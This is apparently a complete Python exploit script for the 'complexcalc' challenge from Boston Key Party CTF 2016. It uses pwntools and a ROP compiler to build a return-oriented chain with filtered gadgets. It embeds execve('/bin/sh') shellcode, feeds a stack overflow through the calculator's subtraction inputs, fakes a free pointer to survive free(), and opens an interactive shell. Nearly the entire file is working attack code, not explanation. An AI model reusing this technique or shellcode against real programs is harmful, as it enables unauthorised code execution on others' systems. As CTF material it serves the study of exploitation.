# An exploit for complexcalc from Boston Key Party CTF 2016 with some exploit help from Evan P. Jensen
#
# This exploit shows off filtering gadgets with a filter function to
# avoid some nasty gadgets from pyvex that decode as rex.WRXB

import time, logging, binascii, archinfo
from rop_compiler import ropme, finder
from pwn import *

######################################################################################
# Generate a ROP chain ###############################################################
######################################################################################

def filter_gadgets(gadgets):
  filtered_gadgets = []
  r15 = archinfo.ArchAMD64().registers['r15'][0]
  for gadget in gadgets:
    if not r15 in gadget.inputs:
      filtered_gadgets.append(gadget)
  return filtered_gadgets
finder.FILTER_FUNC = filter_gadgets

filename='./complexcalc'
files = (filename, filename + '.gadgets', 0)
shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
    "\x48\x31\xd2"                                  # xor    %rdx, %rdx
 +  "\x48\x31\xc0"                                  # xor    %rax, %rax
 +  "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      # mov  $0x68732f6e69622f2f, %rbx
 +  "\x48\xc1\xeb\x08"                              # shr    $0x8, %rbx
 +  "\x53"                                          # push   %rbx
 +  "\x48\x89\xe7"                                  # mov    %rsp, %rdi
 +  "\x50"                                          # push   %rax
 +  "\x57"                                          # push   %rdi
 +  "\x48\x89\xe6"                                  # mov    %rsp, %rsi
 +  "\xb0\x3b"                                      # mov    $0x3b, %al
 +  "\x0f\x05"                                      # syscall
)
ropchain = ropme.rop([files], [], [["shellcode_hex", binascii.hexlify(shellcode)]], log_level = logging.DEBUG)
#ropchain = open("b28_rop4", "r").read()

######################################################################################
# Calculate the values to ensure the free call doesn't crash #########################
######################################################################################

# Variables:
# value        = we write in two dwords
# value_lower  = lower dword of value
# value_higher = upper dword of value
# ptr          = free pointer we write in our overflow
# :binop:      = add, subtract, divide, multiply
# result       = the result of value_lower :binop: value_higher

# Conditions:
# value_lower > 40
# value_higher > 40
# value - [pointer] must be page aligned
# value + (result & 0xfffffffffffffff8) must be page aligned
# result & 2 != 0

# Add
free_pointer = 0x6c4a90 
last_option = 1

# We must set the low value in order to counteract the free_pointer's lower 3 nibbles
last_value_low  = 0xa80
last_value_high = 0xb02

######################################################################################
# Build the exploit ##################################################################
######################################################################################

rop =  ''
rop += 'A'  * 40
rop += '\0' * 8 #options
rop += p64(free_pointer)
rop += '\0' * 8 #more+stuff
rop += '\0' * 8 #stack metadata rbp rsp
rop += ropchain # Add the rop chain

# Split it into 8 byte chunks
def chunk(it,a):
  for i in range(0,len(it),a):
    yield it[i:i+a]
chunks=chunk(rop,8)

# Subtract x from y in 32 bit space
def sub32(x,y):
  ret=x-y
  return ret if ret>=0 else 2**32-ret

minimum_value=40
def find_x_y(value):
  side1,side2=chunk(value,4)
  s1=u32(side1)
  s2=u32(side2)

  x1=s1+minimum_value
  y1=minimum_value
  x2=s2+minimum_value
  y2=minimum_value
  return (x1,y1),(x2,y2)

assert(len(rop)%8==0)

choice_pairs=[]
for i in chunks:
  choice_pairs.extend(find_x_y(i))

######################################################################################
# Send the exploit ###################################################################
######################################################################################

# Write the rop chain to memory using our stack overflow
num_rop_operations = (len(rop)/4) + 1

p=process(filename)
p.readuntil(": ")
p.writeline('{}'.format(num_rop_operations + 1)) # plus one to setup the free pointer metadata
for x,y in choice_pairs:
  p.readuntil("=> ")
  p.writeline('2') # Subtraction
  p.writeline('{}'.format(x))
  p.writeline('{}'.format(y))

# Setup the add area of memory
p.readuntil("=> ")
p.writeline(str(last_option))
p.writeline(str(last_value_low))
p.writeline(str(last_value_high))

# Exit the loop and execute our rop chain
p.readuntil("=> ")
p.writeline('5')

p.interactive()

